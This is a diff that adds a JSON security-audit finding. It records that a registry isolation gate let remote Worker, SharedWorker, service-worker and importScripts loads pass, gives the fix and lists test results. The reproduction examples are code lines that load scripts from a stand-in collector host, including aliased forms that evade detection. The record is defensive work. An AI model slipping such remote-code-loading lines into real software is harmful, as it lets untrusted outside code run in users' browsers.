@@ -1,0 +1,38 @@
+{
+  "findingId": "SEC-37-082",
+  "severity": "medium",
+  "title": "Worker and service-worker code loading bypassed the registry isolation gate",
+  "status": "fixed_locally",
+  "date": "2026-10-21",
+  "reproduction": {
+    "examples": [
+      "new Worker('https://collector.invalid/worker.js');",
+      "const MakeWorker = SharedWorker; new MakeWorker('https://collector.invalid/shared.js');",
+      "navigator.serviceWorker.register('https://collector.invalid/service-worker.js');",
+      "const register = navigator.serviceWorker.register; register('https://collector.invalid/service-worker.js');",
+      "importScripts('https://collector.invalid/worker.js');",
+      "const loadScripts = importScripts; loadScripts('https://collector.invalid/worker.js');"
+    ],
+    "beforeFix": "External Worker and SharedWorker construction, service-worker registration, and importScripts calls returned pass, including statically aliased forms.",
+    "afterFix": "The source-isolation gate rejects worker constructors, service-worker registration, and remote importScripts URLs through direct and statically aliased references."
+  },
+  "rootCause": "Network isolation recognized request APIs but did not classify Worker/SharedWorker constructors or service-worker script-loading entry points as executable remote-code loads.",
+  "affectedFiles": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/registry-gate.test.ts"
+  ],
+  "remediation": "Resolve statically aliased worker constructors and service-worker/importScripts functions with the TypeScript AST, then reject active worker loading without evaluating contributor code.",
+  "validation": {
+    "redBeforeFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t \"remote worker and service-worker code loading\"",
+    "redBeforeFixResult": "failed as expected: direct and aliased worker-loading forms returned pass",
+    "targetedAfterFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts",
+    "registryGateTests": "51 passed",
+    "fullUnitSuite": "1,176 tests passed across 76 files",
+    "typecheck": "22 workspace packages passed",
+    "lint": "0 errors and 33 warnings",
+    "releaseAudit": "16/16 behavioral gates, production builds, bundle budgets, provenance/security audits, and dependency audit passed",
+    "canonicalResourceIsolationMatrix": "324 resources scanned; zero security-isolation failures",
+    "untrustedCodeExecuted": false
+  },
+  "runtimeBoundary": "This is local static source-gate evidence. It does not replace deployed preview sandbox, CSP, or gateway verification."
+}
